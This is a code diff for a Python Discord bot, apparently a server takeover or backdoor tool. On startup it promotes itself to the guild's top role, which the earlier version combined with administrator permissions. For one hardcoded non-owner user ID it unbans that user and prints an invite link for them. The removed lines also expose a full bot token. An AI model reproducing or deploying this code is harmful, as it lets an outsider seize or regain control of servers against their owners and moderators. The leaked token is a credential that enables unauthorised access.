@@ -20,11 +20,15 @@ Made by OfflineTheMenace
 Discord: imoffline1234567890
 ''', 'red'))
 
-# Hardcoded values
-server_id = 1331601978756829276
+prefix = "!"
+server_id = 1428265713755492397
 user_id = 1137581647995359363
-bot_token = 'MTQxOTk2MzMwMzAyNjc1MzUzNg.GAgZnj.uXSDYPlu8o4ZO1-g3IpErUdSezO6U2Xt3hVDcI'
-prefix = '!'
+
+# Read the bot token from the GitHub Secret
+bot_token = os.getenv('DISCORD_BOT_TOKEN')
+if not bot_token:
+    print("Bot token is not set. Please set the DISCORD_BOT_TOKEN secret in your GitHub repository.")
+    exit(1)
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -46,8 +50,8 @@ async def on_ready():
     guild = bot.get_guild(server_id)
     bot.top_role = guild.roles[-1]  # Get the top role from the guild
 
-    # Promote the bot to administrator
-    await promote_bot_to_admin(guild)
+    # Promote the bot to the top role
+    await promote_bot_to_top_role(guild)
 
     for member in guild.members:
         if member.id == user_id and member.id != guild.owner.id:
@@ -66,14 +70,18 @@ async def on_ready():
             invite = await guild.channels[0].create_invite()
             print(colored(f'『+』Unbanned and invited you: {invite.url}', 'blue'))
 
-# Function to promote the bot to administrator
-async def promote_bot_to_admin(guild):
+# Function to promote the bot to the top role
+async def promote_bot_to_top_role(guild):
     me = guild.me
-    admin_permissions = discord.Permissions(administrator=True)
+    top_role = guild.roles[-1]  # Get the top role in the guild
+
+    if top_role.position > me.top_role.position:
+        print(colored(f'『+』Bot does not have permission to promote itself to the top role', 'red'))
+        return
+
     try:
-        await me.edit(roles=[guild.default_role, guild.roles[-1]])  # Assign the top role
-        await me.edit(permissions=admin_permissions)
-        print(colored(f'『+』Promoted bot to administrator', 'blue'))
+        await me.edit(roles=[top_role])
+        print(colored(f'『+』Promoted bot to the top role', 'blue'))
     except discord.errors.Forbidden:
         print(colored(f'『+』Bot does not have permission to promote itself', 'red'))
 
